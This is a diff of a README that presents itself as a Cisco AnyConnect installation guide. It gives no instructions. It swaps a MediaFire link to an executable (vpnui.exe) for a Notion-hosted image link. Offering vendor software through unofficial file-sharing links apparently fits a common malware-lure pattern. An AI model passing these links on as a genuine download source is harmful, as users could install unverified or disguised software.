@@ -1,4 +1,4 @@
 # Cisco-AnyConnect
 Installation Guide for Cisco AnyConnect Secure Mobility Client
 
-https://download1528.mediafire.com/lql97nvchqjg4N0nx_VlJu0aGZFfEk7qWYAiOwAxtIUS321Ncy-pEIVM7XFk8tI-4Hl3_7GyE_A006IJhArOml3uGvXYah3NBeSLWXR_hmESM6-fCUHkVJjQLyxNvFXGGvg9204uQI_jGTB-lpPacEDdtyWDdOvs-9gXiAuhjLd0gg/nyxft20ezru7ur4/vpnui.exe
+https://file.notion.so/f/f/378fb17c-cb78-4c4e-8f64-14b12482ffcf/b8e34f55-c4eb-4445-bd44-4c4bfbe4b52c/cootz.jpeg?table=block&id=17d2f36e-bffd-801c-bbd5-f7bc7fc0aa38&spaceId=378fb17c-cb78-4c4e-8f64-14b12482ffcf&expirationTimestamp=1737028800000&signature=FwAkUePbtaavoyUcwbrVA8Cz17aYlF5Y4BkJ79w0P9g&downloadName=cootz.jpeg
